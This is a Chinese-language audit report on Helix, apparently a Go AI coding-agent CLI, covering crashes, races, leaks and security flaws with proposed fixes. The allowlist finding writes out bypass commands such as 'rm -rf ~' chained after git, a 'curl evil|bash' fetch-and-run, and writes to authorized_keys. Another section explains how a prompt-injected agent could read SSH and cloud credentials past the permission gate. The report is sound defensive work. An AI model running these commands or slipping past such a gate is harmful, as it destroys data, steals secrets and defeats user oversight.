# Helix 全量 Bug 审计报告

> 对 Helix（Go AI Agent CLI）进行的全代码库 bug / 安全 / 健壮性审计

**审计时间**: 2026-06-20
**审计范围**: `internal/**` + `cmd/helix/**` 全部非测试 Go 源码（约 11,134 行 / 56 个文件）
**审计方法**: `go build`（通过）→ `go vet`（无告警）→ `go test ./...`（全通过）→ 按子系统并行逐行人工审查 → 对高影响项直接核对源码
**基线**: `main` @ `597c8f6`（工作区干净，无未提交 diff）

---

## 1. 总览

构建、vet、测试三项全绿——但这仅覆盖 happy path。逐行审查发现：**多个在正常使用中必然触发的正确性 bug**、**安全护栏实际失效**、以及一批健壮性 / 资源泄漏问题。

### 严重程度分布

| 级别 | 数量 | 说明 |
|------|------|------|
| 🔴 Critical | 4 | 进程崩溃 / 命令注入绕过 / 数据错乱 |
| 🟠 High | 11 | 必现正确性 bug / 数据丢失 / 资源泄漏 / 死锁 |
| 🟡 Medium | 9 | 边缘条件 bug / 密钥处理 / DoS |
| ⚪ Low / 潜伏 | 6 | 仅在未接线模块中，或低影响 |

### 快速索引

| # | 文件:行 | 级别 | 一句话 | 核对状态 |
|---|---------|------|--------|----------|
| 1 | `tool/file_tools.go:109` | 🟠 High | `edit_file` 当 new_text 含 old_text 时死循环/OOM | ✅ 直接核对 |
| 2 | `tool/executor.go:112,131` | 🟠 High | 并行结果按工具名做 key → 重复调用结果错乱 | ✅ 直接核对 |
| 3 | `ui/app.go` + `main.go` | 🟠 High | 会话从不落盘 → 退出即丢失全部对话 | ✅ agent 核对 |
| 4 | `ui/app.go:957` | 🔴 Critical | `cancelFunc` 跨 goroutine 数据竞争 | ✅ agent 核对 |
| 5 | `agent/loop.go:226` | 🟠 High | `toolResults[i]` 越界 / 空指针 panic | ✅ agent 核对 |
| 6 | `ui/app.go:748` | 🟡 Medium | UTF-8 按字节截断 → 中文乱码 | ✅ 直接核对 |
| 7 | `agent/loop.go:318` | 🟡 Medium | goal 达成判断结果被丢弃，功能失效 | ✅ agent 核对 |
| 8 | `control/allowlist.go:116` | 🔴 Critical | 白名单前缀匹配 → 命令注入绕过 | ✅ 直接核对 |
| 9 | `tool/file_tools.go:32,66,101` | 🔴 Critical | 文件工具完全不走权限护栏，无路径限制 | ✅ 直接核对 |
| 10 | `control/gate.go:88` | 🟠 High | Auto 模式默认放行，空白名单零防护 | ✅ agent 核对 |
| 11 | `memory/semantic.go:63` | 🔴 Critical | `embedCache` 并发 map 读写 → 不可恢复崩溃 | ✅ agent 核对 |
| 12 | `provider/sse.go:31` | 🟠 High | SSE 缓冲区无上界 → OOM | ✅ 直接核对 |
| 13 | `provider/retry.go:80` | 🟠 High | 重试时 body 为空，重试静默失败 | ✅ 直接核对 |
| 14 | `lsp/client.go:249` / `mcp/client.go:140` | 🟠 High | 持锁无超时阻塞读 → 死锁 | ✅ agent 核对 |
| 15 | `lsp/client.go:217` / `mcp/client.go:163` | 🟠 High | 响应不按 ID 匹配，通知污染流 | ✅ agent 核对 |
| 16 | `lsp/client.go:104` / `mcp/client.go:88` | 🟠 High | 子进程只 Kill 不 Wait → 僵尸 + FD 泄漏 | ✅ agent 核对 |
| 17 | `agent/subagent.go:151` | 🟠 High | 二次 Run → close 已关闭 channel panic | ✅ agent 核对 |
| 18 | `agent/subagent.go` | 🟠 High | 子 agent 递归无深度限制 → 成本/栈爆炸 | ✅ agent 核对 |
| 19 | `tool/command_tools.go:52` | 🟡 Medium | bash 无输出上限/独立超时/进程组清理 | ✅ agent 核对 |
| 20 | `lsp/client.go:303` / `mcp/client.go:166` | 🟡 Medium | API key 注入到每个子进程环境变量 | ✅ agent 核对 |
| 21 | `session/session.go:231` | 🟡 Medium | 会话明文落盘且权限 0644 | ✅ agent 核对 |

---

## 2. Critical 详情

### C1 — 白名单前缀匹配导致命令注入绕过
- **文件**: `internal/control/allowlist.go:116`（配套 `:103` 子串禁止列表）
- **问题**: 白名单匹配用 `strings.HasPrefix(command, allowed)`，对整条原始命令做前缀匹配，不做分词、不识别 shell 分隔符。
- **证据**:
  ```go
  for _, allowed := range a.shellCommands {
      if command == allowed || strings.HasPrefix(command, allowed) {
          return true
      }
  }
  ```
  只要 `git` 在白名单，以下全部放行：`git status; rm -rf ~`、`git log && curl evil|bash`、`gitfoo`、`git --upload-pack='sh -c "..."'`。`Gate.Check` 把 allowlisted 当作硬放行（`gate.go:72`），跳过 Review。配套禁止列表是 `strings.Contains` 子串匹配，漏洞百出：`rm -rf` 拦得住但 `rm -fr`、`|bash`（无空格）、`>~/.ssh/authorized_keys` 都拦不住。
- **影响**: 实际可达的 RCE 绕过。这是整份报告的安全头号问题。
- **修复**: 放弃对原始字符串做前缀匹配。按 shell 分隔符（`;` `&&` `||` `|` 换行 `$(` 反引号）分段，对每段的 argv[0] 做精确白名单校验，默认拒绝；禁止列表仅作纵深防御，不能当主边界。
- **参考**: OWASP Command Injection；CWE-77/78。

### C2 — 文件工具完全不走权限护栏，无任何路径限制
- **文件**: `internal/tool/file_tools.go:32`（read）、`:66`（write）、`:101/122`（edit）
- **问题**: 所有文件工具把模型给的 `path` 直接传给 `os.ReadFile/os.WriteFile`，无 workspace 根限制、无 `filepath.Clean`、无 `Rel` 包含性检查、不解析符号链接，也**不调用** `control` 包的权限检查（只有 `bash` 调）。
- **证据**:
  ```go
  data, err := os.ReadFile(path)              // path 可为 "/etc/passwd" 或 "../../.ssh/id_rsa"
  os.WriteFile(path, []byte(content), 0644)   // 可写 "~/.ssh/authorized_keys"
  ```
- **影响**: 被 prompt 注入的模型可读取 `~/.ssh/id_rsa`、`~/.aws/credentials`，覆写 `~/.zshrc`、`authorized_keys` 等任意进程用户可触达的路径。`bash` 至少有 `PermissionChecker` 钩子，文件工具一个护栏都没有。
- **修复**: 注入 workspace 根并对每个路径做包含性校验 `rel, err := filepath.Rel(root, abs); if err != nil || strings.HasPrefix(rel, "..") { 拒绝 }`；用 `EvalSymlinks` 防符号链接逃逸；对文件工具套用与 bash 相同的权限检查链。

> 说明：对编码 agent 而言"读写文件"本就是产品能力，问题不在能力本身，而在于 **`internal/control` 是唯一安全边界，但 (a) 它可被绕过（C1）、(b) 文件工具根本不经过它、(c) Auto 模式默认放行（H6）**——三者叠加使护栏整体失效。

### C3 — TUI `cancelFunc` 跨 goroutine 数据竞争
- **文件**: `internal/ui/app.go:957`（写）vs `:266,:353-354`（读/写）
- **问题**: `runAgent` 返回的 `tea.Cmd` 在 Bubble Tea 的独立 goroutine 中运行，并在其中 `a.cancelFunc = cancel`；同时 Update 循环（esc 键、streamDone/streamError）读写同一字段，无锁。`streamMu` 只护 `streamBuf`。
- **影响**: `go run -race` 必报。按 Go 内存模型属未定义行为；用户在 Cmd goroutine 赋值前按 esc 会丢失取消能力。
- **修复**: 把 `context.WithCancel` 移到 `handleEnter`（Update 循环内）创建并存 `a.cancelFunc`，把 `ctx` 作为参数传入闭包。

### C4 — 语义记忆 `embedCache` 并发 map 读写导致不可恢复崩溃
- **文件**: `internal/memory/semantic.go:63-75`、`104-131`
- **问题**: `getEmbed` 读（`:66`）写（`:73`）`embedCache` 完全在锁外——`idx.mu` 只在其返回后才加锁，且只保护 `documents`。`AddBatch` 同样在锁外读写该 map。
- **证据**: Go map 非并发安全。并发调用 `Add`/`Search`/`AddBatch` → `fatal error: concurrent map read and map write`，**无法 recover**。结构体已有 `mu sync.RWMutex` 并用于 `documents`，说明并发是预期的，只是漏了 `embedCache`。
- **修复**: 用独立的 `cacheMu` 保护缓存读写（避免在网络 `Embed` 调用期间长持文档锁）；`Clear()` 也要清 `embedCache`。

---

## 3. High 详情

### H1 — `edit_file` 死循环 → 进程挂死 / OOM
- **文件**: `internal/tool/file_tools.go:109-116`
- **证据**:
  ```go
  for {
      idx := findSubstring(newContent, oldText)   // 每轮从头扫重写后的内容
      if idx < 0 { break }
      newContent = newContent[:idx] + newText + newContent[idx+len(oldText):]
      count++
  }
  ```
  当 `new_text` 包含 `old_text`（如 old=`foo`、new=`foobar`，常见编辑场景）时永不终止，字符串无限增长 → 挂死 + 内存爆炸。且它替换**所有**匹配，与"精确替换"描述矛盾——`review.go:267` 用的是 `strings.Replace(...,1)`，两处行为不一致。
- **修复**: 改为只替换首个匹配（与 `review.go` 对齐），或把搜索游标推进到插入文本之后；空 `old_text` 已有守卫。

### H2 — 并行工具结果按工具名做 key → 返回错乱结果
- **文件**: `internal/tool/executor.go:112`（写入）+ `:131-142`（合并）
- **证据**:
  ```go
  results[c.Name] = result                       // 两个 read_file → 后者覆盖前者
  ...
  if r, ok := readResults[call.Name]; ok { results[i] = r }  // 两个位置拿同一结果
  ```
  模型一轮内发两次 `read_file`（读不同文件）是常态；第二个结果覆盖第一个，合并时两个原始位置都被赋同一个结果——静默把错误内容回传模型。
- **修复**: 按调用**下标**而非名字做 key；预分配 `[]*Result`，goroutine 内写 `results[idx]`，按位置合并。

### H3 — TUI 会话从不落盘，退出即丢失全部对话
- **文件**: `cmd/helix/main.go:282`（创建 Manager）+ `internal/ui/app.go`（无任何 Save 调用）
- **问题**: `session.Manager` 被创建并注入 App，但没有任何地方把 `a.messages` 写回 `sess.Messages` 或调用 `Save()`。`/quit`、`ctrl+c`、正常退出全部丢历史。`/sessions new` 创建的会话对象同样收不到消息。
- **修复**: 在 `streamDoneMsg`（及 `/clear`、`/compact`）时把新消息追加进活动会话并 `Save()`；`tea.Quit` 前用 `tea.Sequence(saveCmd, tea.Quit)` 落盘。

### H4 — agent 工具结果索引越界 / 空指针 panic
- **文件**: `internal/agent/loop.go:226-227`、`:334`
- **问题**: `toolResults[i].Content` / `.OK()` 假设 `len(toolResults)==len(toolCalls)` 且每个元素非 nil，但 `executeTools` 直接返回 executor 的结果，未做规整。executor 在 ctx 取消等情况可能返回更短 slice 或 nil 元素 → 越界 / 空指针 panic，整个 agent 循环 goroutine 崩溃。
- **修复**: 校验长度并对每个元素做 nil 检查；不匹配时补造 error Result 保持一致。

### H5 — SSE 读缓冲区无上界 → OOM
- **文件**: `internal/provider/sse.go:31-33`
- **证据**: `s.buf = append(s.buf, s.tmp[:n]...)`，仅在遇到 `\n\n` 分隔时裁剪，无任何上限。恶意/异常服务端持续发送不含 `\n\n` 的数据即可把内存撑爆。手写版等价于 `bufio.Scanner: token too long`，但连那个错误守卫都没有。
- **修复**: 增加可配置上限（如 1–10MB），超限无分隔符即返回错误中止流。

### H6 — Auto 模式默认放行，空白名单零防护
- **文件**: `internal/control/gate.go:88-91`
- **证据**:
  ```go
  if g.mode == ModeAuto {
      return true, "auto-approved"   // 非只读、非白名单的操作直接放行
  }
  ```
  注释承诺"可撤销"，但无任何记录/撤销实现。默认空白名单配置在 Auto/Yolo 模式下完全无防护。
- **修复**: Auto 模式对 bash / 高危写操作仍走白名单（默认拒绝），或真正实现可撤销记录。

### H7 — 重试时 body 为空，重试静默失败
- **文件**: `internal/provider/retry.go:80-85`
- **证据**:
  ```go
  if seeker, ok := req.Body.(interface{ Seek(int64, int) (int64, error) }); ok {
      seeker.Seek(0, 0)
  }
  ```
  各 provider 用 `bytes.NewReader(body)` 构造请求，`http.NewRequestWithContext` 会把 body 包成不暴露 `Seek` 的 ReadCloser，故该断言**永远 false**，重试的 POST 发的是已耗尽的空 body → 触发 400（不在 RetryOn，升级为硬错误）。`retry_test.go` 只查 callCount 不查 body，漏掉了。
- **修复**: 删掉 Seek 断言，改用 `req.GetBody`（`bytes.Reader` 会自动填充）：`if req.GetBody != nil { b, _ := req.GetBody(); req.Body = b }`。

### H8 — LSP/MCP 持锁无超时阻塞读 → 死锁
- **文件**: `internal/lsp/client.go:249`、`internal/mcp/client.go:140-164`
- **问题**: `call()` 在持有 `c.mu` 状态下做无超时、无 context 的 `ReadBytes('\n')` / `ReadString('\n')`。子进程卡住（接收请求但永不回 newline）即永久阻塞该 goroutine 并占着锁，后续所有 `call` 全部堵死。
- **修复**: 引入后台 reader goroutine + 按 ID 路由的 pending-request map；`call` 在 `select` 中等结果 channel / `ctx.Done()` / 超时；context 一路透传到 `CallTool`。

### H9 — LSP/MCP 响应不按 ID 匹配，通知污染流
- **文件**: `internal/lsp/client.go:217,268`、`internal/mcp/client.go:163`
- **问题**: 请求里写了递增 ID，但读响应时从不比对 `resp.ID == id`。LSP 服务端会主动推 `publishDiagnostics`、`$/progress`、`window/showMessage` 等；同步读会把下一条消息当成本次响应解析，返回空/错数据（类型混淆），并使后续所有 ID/响应配对永久错位。
- **修复**: 同 H8 的 reader 循环，按 `id` demux 到各自的响应 channel，通知单独路由；校验 `jsonrpc == "2.0"` 且 result/error 恰有其一。

### H10 — LSP/MCP 子进程只 Kill 不 Wait → 僵尸 + FD 泄漏
- **文件**: `internal/lsp/client.go:104`、`internal/mcp/client.go:88`
- **问题**: `Close()` 只 `Process.Kill()`，从不 `cmd.Wait()`。Unix 下被杀子进程变僵尸直到被回收；`exec.Cmd` 持有的管道 FD 也只在 `Wait` 时释放。长会话反复连断插件/语言服务器会累积 PID 和 FD 泄漏。
- **修复**: `Kill()` 后 `cmd.Wait()`（忽略 "signal: killed"）；可先 `SIGTERM` 优雅退出再 `SIGKILL`。

### H11 — subagent 二次 Run → close 已关闭 channel panic；递归无深度限制
- **文件**: `internal/agent/subagent.go:143,151`
- **问题**: `Run` 仅守卫 `status == StatusRunning`。首次完成后状态变为 `Completed`，二次 `Run` 通过守卫、重置为 Running、再起一个 goroutine `defer close(sa.done)` → 对已关闭 channel 二次 close → panic 崩进程。另：`ParentID`/depth 字段存在却从不设置/检查，子 agent 可无限递归 spawn → 成本/栈爆炸。
- **修复**: `Run` 用 `sync.Once` 或守卫 `status != StatusPending` 做成一次性；`Spawn` 传入并校验 depth（如 ≤ 2–3），设置 `ParentID`。

---

## 4. Medium 详情

| # | 文件:行 | 问题 | 修复 |
|---|---------|------|------|
| M1 | `ui/app.go:748,755` | `content[:100]` 按字节切，中文（3字节/字）频繁切在字符中间 → 非法 UTF-8 / 渲染乱码 | 改用 `[]rune` 截断 |
| M2 | `agent/loop.go:318-324` | goal 两个分支都 `return resp.Content, nil`，`Evaluate` 的 `achieved` 没用上，目标停止功能失效且白花一次裁判调用 | 未达成时追加提示并 `continue` |
| M3 | `tool/command_tools.go:52-54` | bash 用 `CombinedOutput()` 无输出上限（`cat /dev/zero` 即 OOM）、无独立超时、ctx 取消只杀直接子进程不杀进程组 | `io.LimitReader` 截断；`WithTimeout`；`Setpgid`+ 进程组 kill |
| M4 | `lsp/client.go:303` / `mcp/client.go:166` | `DEEPSEEK/OPENAI/ANTHROPIC_API_KEY` 注入每个 LSP/插件子进程环境，第三方二进制白拿密钥 | 子进程环境移除 API key，只传 PATH/HOME 等必要项 |
| M5 | `session/session.go:231` `crypto.go:140` | 会话/`.enc` 文件 0644（其他用户可读），含完整对话历史；目录 0755 | 文件改 0600，目录 0700 |
| M6 | `session/session.go:190` | `saveMeta` 不加锁却 `os.Create` 截断写，与 `appendToFile`(持锁) 竞争 → 可能截断/丢消息 | `saveMeta` 加锁；全文重写用 临时文件 + Rename 原子化 |
| M7 | `memory/semantic.go:121-131` | `AddBatch` 假设 `len(vectors)==len(texts)`，provider 返回更短切片即越界 panic | 校验长度，per-vector nil 防护 |
| M8 | `dashboard/server.go:34` | `http.ListenAndServe` 无任何超时 → Slowloris/慢连接耗尽 goroutine | 显式构造 `http.Server` 设 Read/Write/Idle 超时 |
| M9 | `dashboard/server.go:15` | 所有端点无认证；`addr` 不强制回环，日志却硬写 "localhost"，传 `:8080` 会监听全网卡 | 默认绑 `127.0.0.1`；日志打印真实 addr；接真实数据前加鉴权 |

---

## 5. Low / 潜伏问题

这些位于**当前未接线或返回 mock 数据**的模块，暂不影响运行，但接线后即生效，先记录：

- **`session/crypto.go:34`** — 密钥派生用 `SHA256("helix-session-"+hostname+"-"+username)`，全是公开信息，等同硬编码密钥；env-var 路径也只过一次 SHA-256 无 salt/KDF。**但该 crypto 模块当前无生产调用方，会话实际明文存储。** 接线前必须改为随机密钥 + Argon2id/scrypt + 随机 salt。
- **`dashboard/websocket.go`** — WebSocket 是空实现（不 upgrade）；`WSHub.Broadcast` 是 lock/unlock 空操作；无 register/unregister 路径。实现时务必加 `CheckOrigin` 白名单、读写 deadline、连接清理。
- **`config/config.go:170`** — `home, _ := os.UserHomeDir()` 吞错误，`$HOME` 为空时配置路径退化为 CWD 相对路径 `.helix/config.toml`，可被同目录恶意配置注入。
- **`skills/manager.go:48`** — 技能目录用 `entry.IsDir()`（跟随符号链接），符号链接可使技能内容读取目录外文件并注入 prompt。改用 `entry.Type()` 排除符号链接或 `EvalSymlinks` + 包含性校验。
- **`memory/semantic.go:26,226`** — `Document.Vector` 带 `json:"-"`，Save/Load 往返后所有向量为 nil，Search 全部跳过——索引静默失效直到重新 embed。
- **`provider/loadbalancer.go:130`** — `SetWeight` 接受负权重，`weightedRandom` 的 `rand.Intn(totalWeight)` 在 totalWeight≤0 时 panic。

---

## 6. 已核对为干净的项（避免误报）

- **SQL 注入**: `memory/store.go` 全部参数化（`?`），含 FTS `MATCH ?`。干净。
- **AEAD/Nonce**: `crypto.go` 用 AES-256-**GCM** + `crypto/rand` nonce，无 ECB、无 nonce 复用、无 padding oracle，短密文有守卫。加密原语本身正确（问题只在密钥派生）。
- **agent 主循环最大轮次**: `Run`/`RunStream` 由 `for step < a.maxSteps` 正确限界，无死循环（唯一无界路径是子 agent 递归 H11）。
- **cosine 相似度除零**: `normalizeVector` 在 norm==0 时返回原值，`dotProduct` 有长度守卫。干净。
- **TLS**: provider 各处无 `InsecureSkipVerify`，用默认验证。干净。
- **Registry / EventLog / SubAgentManager / CostController 并发**: 均正确用 `sync.RWMutex` 守护，无裸并发 map 访问。干净。
- **TUI 类型断言 / 斜杠命令解析**: `tea.Msg` 断言都在已确定类型的 switch 内；`parts[0]` 有 `/` 前缀 + 非空守卫。干净。

---

## 7. 修复优先级建议

按"会不会真的咬到用户 / 是否可被利用"排序：

1. **先修崩溃 / 数据错乱类**（影响最直接）：C4(并发 map 崩溃)、H1(edit 死循环)、H2(结果错乱)、H4(越界 panic)、H11(channel panic)。
2. **再修数据丢失**：H3(会话不落盘)。
3. **然后修安全边界**：C1(白名单绕过)、C2(文件工具无护栏)、H6(Auto 默认放行)——三者需一起改，否则补一个仍可从另一个绕过。
4. **TUI 体验必现**：C3(数据竞争)、M1(中文乱码)。
5. **健壮性 / 泄漏**：H5/H7/H8/H9/H10、M3/M4/M5。

建议按 systematic-debugging + TDD 流程逐个修：每项先写复现测试（红）→ 最小改动转绿 → 回归。可分批，每批一个子系统（tool / agent / control / provider+lsp+mcp / ui+session）。

---

*报告生成: 2026-06-20 ｜ 方法: 全代码库并行逐行审查 + 高影响项源码直核 ｜ 未修改任何源码*
